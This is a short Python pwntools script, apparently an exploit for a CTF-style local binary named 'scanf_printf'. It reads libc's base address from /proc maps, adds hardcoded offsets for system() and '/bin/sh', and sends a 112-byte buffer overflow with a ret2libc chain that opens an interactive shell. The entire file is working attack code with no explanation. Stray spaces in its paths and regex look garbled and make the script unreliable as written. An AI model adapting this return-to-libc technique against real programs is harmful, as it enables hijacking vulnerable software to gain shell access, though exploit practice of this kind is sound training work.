#!/ usr/bin / python

import re
from pwn import p32, process

p = process ('./ scanf_printf ')
libc_addr = None

with open('/proc/{}/maps'.format(p.pid), 'r') as fd :
    for l in fd :
        r = re . search (r'^([0 -9a-f ]*) -.*/ lib32 /libc -2.19. so$ ', l )
        if r :
            libc_addr = int(r.group(1), 16)
            break

system_offset = 254944
system_addr = libc_addr + system_offset
binsh_offset = 1439057
binsh_addr = libc_addr + binsh_offset
print 'libc_addr :', libc_addr
print 'system_addr :', system_addr
print 'binsh_addr :', binsh_addr
ret_offset = 112
payload = 'A' * ret_offset + p32(system_addr) + 'BBBB ' + p32(binsh_addr)
p.sendline(payload)
p.clean()
p.interactive()